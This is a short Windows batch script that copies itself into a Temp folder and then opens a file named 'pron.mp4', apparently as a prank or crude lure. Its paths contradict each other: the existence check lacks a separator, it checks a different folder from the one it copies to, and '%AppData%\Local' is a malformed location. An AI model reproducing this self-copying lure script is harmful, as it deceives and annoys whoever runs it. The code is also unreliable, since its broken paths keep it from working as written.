@echo off
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A

if exist "%userprofile%/AppData/Local/Temp%~n0%~x0" (
%userprofile%/AppData/Local/Temp/pron.mp4
pause

) else (
copy /y %~f0 "%AppData%\Local\Temp"
%AppData%\Local\Temp\pron.mp4
)
cls
